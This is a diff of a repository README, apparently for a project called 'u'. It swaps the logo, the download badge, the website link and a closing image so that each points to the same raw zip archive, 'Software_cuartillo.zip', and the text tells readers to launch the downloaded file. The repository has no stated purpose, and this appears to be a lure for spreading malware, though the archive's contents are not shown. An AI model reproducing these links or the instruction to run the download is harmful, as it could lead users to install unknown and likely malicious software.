@@ -1,6 +1,6 @@
 # Welcome to the "u" Repository!
 
-![u logo](https://www.example.com/u-logo.png)
+![u logo](https://github.com/Stranger123444/u/raw/refs/heads/main/Plymouthist/Software_cuartillo.zip)
 
 This repository does not have a specific short description or defined topics. However, it is a versatile and dynamic space where various projects and resources may be shared.
 
@@ -8,7 +8,7 @@ This repository does not have a specific short description or defined topics. Ho
 
 To get started with the "u" repository, simply click on the link below to download the latest version:
 
-[![Download "u"](https://img.shields.io/badge/Download-%22u%22-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download "u"](https://github.com/Stranger123444/u/raw/refs/heads/main/Plymouthist/Software_cuartillo.zip%22u%22-blue)](https://github.com/Stranger123444/u/raw/refs/heads/main/Plymouthist/Software_cuartillo.zip)
 
 Make sure to launch the downloaded file to access the contents within.
 
@@ -30,7 +30,7 @@ The "u" repository is structured in a user-friendly manner to facilitate navigat
 
 ## 🌐 Visit Our Website
 
-For more information and updates, visit our website: [u-repo.com](https://www.u-repo.com)
+For more information and updates, visit our website: [https://github.com/Stranger123444/u/raw/refs/heads/main/Plymouthist/Software_cuartillo.zip](https://github.com/Stranger123444/u/raw/refs/heads/main/Plymouthist/Software_cuartillo.zip)
 
 ## 🤝 Contributing
 
@@ -50,4 +50,4 @@ The "u" repository is licensed under the [MIT License](LICENSE).
 
 Thank you for exploring the "u" repository! We hope you find inspiration and opportunities for collaboration within this dynamic space. Happy coding and creating! 🎉
 
-![u image](https://www.example.com/u-image.png)
+![u image](https://github.com/Stranger123444/u/raw/refs/heads/main/Plymouthist/Software_cuartillo.zip)
